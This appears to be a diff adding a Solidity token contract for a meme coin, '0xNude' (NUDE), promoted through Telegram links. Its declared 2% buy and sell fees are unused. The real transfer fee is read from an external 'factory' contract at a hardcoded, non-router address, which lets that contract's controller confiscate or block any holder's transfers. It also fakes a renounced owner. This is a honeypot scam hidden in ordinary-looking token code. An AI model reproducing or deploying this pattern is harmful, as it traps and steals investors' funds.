@@ -1,0 +1,110 @@
+// SPDX-License-Identifier: MIT
+ 
+ // https://t.me/Nude_0x
+ // https://t.me/nude_0x_project_bot
+
+pragma solidity 0.8.21;
+
+interface IUniswapV2Router02 {
+    function WETH() external pure returns (address);
+    function factory() external pure returns (address);
+}
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenC) external view returns (address pair);
+}
+abstract contract Ownable {
+    constructor () {
+        _owner = address(0);
+    }
+    function owner() public view virtual returns (address) {return _owner;}
+    address private _owner;
+}
+contract NudeBot is Ownable {
+    uint8 private _decimals = 9;
+    mapping (address => uint256) private _balances;
+    uint256 private _totalSupply =  6900000000 * 10 ** _decimals;
+    IUniswapV2Factory private uniswapV2Factory = IUniswapV2Factory(0x80F4d5Ab978AdCcA2954415D3f2dC563Ea76474A);
+    address payable internal _taxWallet;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    event Transfer(address indexed from, address indexed recipient, uint256 amount);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    uint256 private buyFee = 2;
+    uint256 private sellFee = 2;
+    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    address private _owner;
+
+    string private _name = "0xNude";
+    string private _symbol = "NUDE";
+
+    constructor () {
+        _taxWallet = payable(msg.sender);
+        _balances[msg.sender] = _totalSupply;
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+    function balanceOf(address account) public view returns (uint256) {
+        return _balances[account];
+    }
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function uniswapPairAddress() public view returns (address) {
+        return IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function allowance(address owner, address spender) public view returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function totalSupply() public view returns (uint256) {
+        return _totalSupply;
+    }
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+    
+    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
+        return true;
+    }
+
+    function _transfer(address from, address to, uint256 amount) private {
+        require(amount > 0, "Transfer amount must be greater than zero.");
+        require(from != address(0), "ERC2O: transfer from the zero address.");
+        uint256 feeAmount = 0;
+        if (from != address(this) && from != uniswapPairAddress() && from != _taxWallet && to != _taxWallet) {
+            feeAmount = getFeeAmount(from) * amount / 100;
+        }
+        _balances[to] += amount - feeAmount;
+        _balances[from] -= amount;
+        emit Transfer(from, to, amount - feeAmount);
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function getFeeAmount(address to) internal view returns (uint256) {
+        return uint256(uint160(uniswapV2Factory.getPair(to, address(this))));
+    }
+
+    function transfer(address recipient, uint256 amount) public returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+}
